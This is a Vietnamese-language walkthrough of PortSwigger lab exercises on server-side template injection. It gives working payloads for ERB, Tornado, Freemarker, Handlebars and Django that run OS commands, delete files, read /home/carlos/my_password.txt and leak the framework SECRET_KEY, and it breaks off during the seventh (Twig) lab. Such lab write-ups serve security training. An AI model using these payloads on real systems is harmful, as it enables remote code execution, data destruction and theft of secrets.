# [Portswigger] Server-side template injection

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3e6623ba-fc70-4e15-8d32-364d0918eb22)

***

## 1. Lab: Basic server-side template injection

* Content:
```
This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
```
* Exploit:

Nghiên cứu cấu trúc của ERB template => Dùng  cú pháp: `<%= expression %>`

Khi ấn vào link 1 sản phẩm bất kỳ => Xuất hiện parameter `message`

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/470745af-55b0-4f48-9f94-51bebcd97e22)

=> Thử fill cú pháp của ERB template: `message=%3C%=%207*7%20%%3E` (`message=<%= 7*7 %>`)

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/affb0a8c-e4af-44b3-ac9e-857edf87ce4d)

Dùng lệnh `system()` để truyền command:

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f427c46c-028e-4a62-b101-753bb6175fe0)

Thực hiện xóa file theo yêu cầu của lab:

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/e24b737b-0e2f-4931-b3e8-6c46e5bb1cc7)

LAB SOLVED!

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/0c88bb34-9130-463c-aac1-822d3bba4ea8)

***

## 2. Lab: Basic server-side template injection (code context)

* Content:
```
This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter
```
* Exploit:

Nghiên cứu `Tornado template` => Sử dụng expression `{{ }}`

Tập trung vào tính năng `Preferred name`:

<img width="405" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/15203fc3-311a-4b63-979e-5389a5722ffd">

Thay đổi giá trị submit lên là `user.name}}{{7*7}}`:

<img width="451" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3b7fb10b-e4f4-4d79-bd79-35dd16d419d9">

Thực hiện post 1 comment lên và quan sát tên hiển thị => Thấy giá trị `49` xuất hiện, chứng tỏ vị trí `Preferred name` bị dính lỗi SSTI:

<img width="374" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9ee75eb4-c649-4c6c-a8f8-29449b058fae">

`Tornado template` sử dụng cú pháp sau để chạy lệnh OS => Áp dụng xóa file LAB yêu cầu:

<img width="167" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/189bd6e5-d9b8-4d41-abca-87c7f8cb9236">

LAB SOLVED!

<img width="593" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/310cf722-87fa-4eba-8da3-2ee23d43fe6f">

***

## 3. Lab: Server-side template injection using documentation

* Content:
```
This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials:

content-manager:C0nt3ntM4n4g3r
```
* Exploit:

Thực hiện edit mô tả một sản phẩm bất kỳ, thấy nội dung có chứa đoạn code template: `${product.stock} left of ${product.name} at ${product.price}.`

<img width="384" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/e575e75a-e975-4899-a90c-7a32e7588c54">

Thử nhập vào các payload nhằm trigger thông tin lỗi như: `${}`, `${7/0}`, `${foobar}`, `${7*7}`

Thấy thông tin loại template sử dụng => `freemarker`

<img width="600" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/466f1726-a520-4123-a559-89b09c21cb6c">

Áp dụng payload:

`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`

Kết qủa response trả về:

<img width="594" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/59bbe83d-afc2-4199-9af3-247677c7b774">

=> Thực hiện xóa file theo yêu cầu:

`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }`

LAB SOLVED!

<img width="595" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4cf25a48-9f68-4d2d-be16-e83c8b0b993c">

***

## 4. Lab: Server-side template injection in an unknown language with a documented exploit

* Content:
```
This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
```
* Exploit:

Ban đầu thử nghiệm payload: `{{7/0}}` => Sinh ra exception:

<img width="601" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/dcce3618-5987-44a2-9bd7-0c5d474bd51b">

Qua đó xác đinh được template engine đang sử dụng là `handlebars`

Áp dụng payload:
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
<img width="629" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/8c4718de-b18b-4fa1-9a45-32c65685a8b0">

Thay bằng command xóa file theo yêu cầu:
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
<img width="580" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/61fa6cbf-a6a0-4308-b14d-c183b4685d63">

LAB SOLVED!

***

## 5. Lab: Server-side template injection with information disclosure via user-supplied objects

* Content:
```
This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

To solve the lab, steal and submit the framework's secret key.

You can log in to your own account using the following credentials:

content-manager:C0nt3ntM4n4g3r
```
* Exploit:

Vị trí mắc lỗi ghi nhận tại tính năng edit mô tả sản phẩm:

<img width="377" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/b4176f99-c8ad-46ef-adbe-cd17c3ea7902">

=> Truyền vào payload `{{7/0}}` => Phát hiện ra template engine sử dụng là `django`

<img width="582" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/fe3fb207-944b-4a49-91bb-f595cb37b8df">

=> Truyền vào payload <img width="55" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/2fa66a9e-5985-49ec-916e-f2d3677489bd">
 để list ra các objects và properites sử dụng trong Template

=> Truyền vào payload `{{settings.SECRET_KEY}}`

<img width="588" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/b7c94d2b-d8fd-4bbd-a709-d28294238579">

Submit => LAB SOLVED!

<img width="578" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/5a7e5fd7-d0c2-4c43-a306-516d558c08e5">

***

## 6. Lab: Server-side template injection in a sandboxed environment

* Content:
```
This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my_password.txt from Carlos's home directory. Then submit the contents of the file.

You can log in to your own account using the following credentials:

content-manager:C0nt3ntM4n4g3r
```
* Exploit: 

Tìm ra vị trí mắc lỗi SSTI ở bước edit chỉ tiết sản phẩm

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1dea7e8f-c07b-4fbb-a0c4-18fc092b4382)

Truyền vào payload để trigger error nhắm tìm ra Template Engine => `freemarker`

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/2ca48bbd-1554-48d6-8324-1f0b54bc190b)

Tìm payload của `freemarker` cho phép đọc file, truyền vào vị trí lỗi:

`${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`

=> Read được file content:

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7f71203f-994b-4885-8d7e-164cf2b095a6)

File content là dạng bytes => Cần convert sang ASCII

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7aecde13-b0ad-4816-aaae-9058125b5696)

LAB SOLVED!

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/ce7f2105-214f-4787-9f0e-2a936442f3f8)

***

## 7. Lab: Server-side template injection with a custom exploit

* Content:
```
This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file /.ssh/id_rsa from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

Warning
As with many high-severity vulnerabilities, experimenting with server-side template injection can be dangerous. If you're not careful when invoking methods, it is possible to damage your instance of the lab, which could make it unsolvable. If this happens, you will need to wait 20 minutes until your lab session resets.
```
* Exploit:

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3a81383e-f079-4bcc-9470-c489b13fa25b)

Detect Template Engine => `twig`

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/56c4f3f2-158e-4b22-8c4c-4fe7048ae502)

Upload 1 file định dạng sai lên phần avatar, ta thấy thông báo lỗi lộ thông tin phần xử lý upload avatar nằm ở link `/home/carlos/User.php`

![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1acd74b0-eadb-4440-87d1-1f87c73b2536)

